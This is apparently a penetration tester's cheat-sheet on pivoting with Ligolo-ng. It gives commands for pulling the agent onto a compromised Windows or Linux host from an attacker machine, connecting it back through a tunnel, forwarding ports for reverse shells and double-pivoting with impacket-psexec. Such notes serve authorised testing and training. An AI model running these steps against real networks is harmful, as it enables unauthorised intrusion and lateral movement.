---
tags:
  - Foundational
  - Lateral_Movement
  - Ligolo
  - Network
  - Windows
---

## Pivoting with Ligolo-ng
resources: [Ligolo-ng GitHub](https://github.com/Nicocha30/ligolo-ng), [Ligolo-ng Docs](https://docs.ligolo.ng/), [LigoloSupport GitHub](https://github.com/Real-Fruit-Snacks/LigoloSupport)

> [!info] Creates tunnels using a TUN interface instead of SOCKS proxies. Run tools like **Nmap**, **Impacket**, and **NetExec** directly without proxychains. Agent requires no admin privileges.

> [!important] **Requirements:**
> - Root/admin on attack machine (to create TUN interface)
> - Agent binary transferred to compromised host
> - Network connectivity between agent and proxy (default port 11601)

### Install on Kali [Local]
```bash
sudo apt install ligolo-ng
```

### Download from GitHub [alternative]
```bash
wget https://github.com/Nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_<Version>_linux_amd64.tar.gz
wget https://github.com/Nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_<Version>_windows_amd64.zip
```

### Automated Setup with LigoloSupport [Local]
> [!tip] One-command setup: downloads binaries, configures TUN interface, hosts file server on port 8000, and starts proxy.

```bash
curl -O https://raw.githubusercontent.com/Real-Fruit-Snacks/LigoloSupport/main/ligolo-helper.sh && chmod +x ligolo-helper.sh
```

```bash
sudo ./ligolo-helper.sh auto
```

### Individual LigoloSupport Commands [alternative]
```bash
./ligolo-helper.sh download
./ligolo-helper.sh setup-tun
./ligolo-helper.sh proxy
./ligolo-helper.sh add-route <Subnet>
./ligolo-helper.sh agent-cmd
./ligolo-helper.sh status
```

### Manual Setup - Create TUN Interface [alternative]
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
```

```bash
sudo ip link set ligolo up
```

### Manual Setup - Start Proxy Server [alternative]
```bash
./proxy -selfcert
```

```bash
./proxy -autocert
```

### Transfer Agent to Target [Remote]
```powershell
powershell wget http://<KaliIP>/agent.exe -o agent.exe
```

```bash
curl http://<KaliIP>/agent -o agent && chmod +x agent
```

### Run Agent on Target [Remote]
```bash
./agent -connect <KaliIP>:11601 -ignore-cert
```

```bash
./agent -connect <KaliIP>:11601 -ignore-cert -retry
```

```bash
./agent -connect <KaliIP>:11601 -accept-fingerprint <SHA256Fingerprint>
```

### Select Session and Start Tunnel [Local]
> [!info] Run these commands in the **Ligolo-ng** proxy console.

```text
session
```

```text
start
```

### Add Route to Target Network [Local]
```bash
sudo ip route add <TargetSubnet>/24 dev ligolo
```

### Verify Tunnel Works [Local]
```bash
ping <InternalTargetIP>
```

```bash
nxc smb <TargetSubnet>/24
```

### Cleanup [Local]
```text
stop
```

```bash
sudo ip route del <TargetSubnet>/24 dev ligolo
```

```bash
sudo ip link set ligolo down
sudo ip tuntap del mode tun ligolo
```

### Cleanup with LigoloSupport [alternative]
```bash
./ligolo-helper.sh del-route <TargetSubnet>/24
./ligolo-helper.sh teardown-tun
```

## Port Forwarding

> [!tip] Forward ports from your attack machine through the tunnel to the target network. Useful for reverse shells.

### Add Listener [Local]
> [!info] Run in **Ligolo-ng** proxy console.

```text
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

### List Listeners [Local]
```text
listener_list
```

### Remove Listener [Local]
```text
listener_del --id <ListenerID>
```

## Double Pivot

> [!tip] Pivot through multiple networks by running agent on each hop.

### Access Second Network Host [Local]
```bash
impacket-psexec <Domain>/<User>:<Pass>@<SecondPivotIP>
```

### Transfer Agent to Second Pivot [Remote]
```powershell
powershell wget http://<KaliIP>/agent.exe -o agent.exe
```

### Create Listener for Second Agent [Local]
> [!info] On first session, forward port 11601 to Kali.

```text
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
```

### Run Agent on Second Pivot [Remote]
```bash
./agent -connect <FirstPivotIP>:11601 -ignore-cert
```

### Add Route for Second Network [Local]
```bash
sudo ip route add <SecondSubnet>/24 dev ligolo
```
